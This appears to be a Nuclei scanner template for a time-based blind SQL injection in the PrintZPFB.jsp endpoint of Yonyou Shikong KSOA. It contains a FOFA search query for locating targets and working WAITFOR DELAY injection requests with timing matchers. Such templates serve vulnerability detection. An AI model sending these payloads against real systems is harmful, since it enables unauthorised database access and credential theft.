id: yongyoushikong-KSOA-PrintZPFB-sql

info:
  name: 用友时空KSOA PrintZPFB.jsp接口SQL延时注入漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: app="用友-时空KSOA"
    用友时空KSOA系统的PrintZPFB.jsp接口存在未经验证的SQL时间盲注漏洞。攻击者可通过构造恶意SQL查询实现数据库信息检索，包括敏感凭据及用户数据。在具备高权限访问条件下，可能通过注入点执行任意代码，导致服务器控制权丧失。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/140842139
  tags: 用友时空KSOA



http:
- raw:
  - |
    GET /kp/PrintZPFB.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
    Host: {{Hostname}}


  - |
    GET /kp/PrintZPFB.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
    Host: {{Hostname}}


  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=6 && duration_1<=7'
    - 'duration_2>=8 && duration_2<=9'
    condition: and







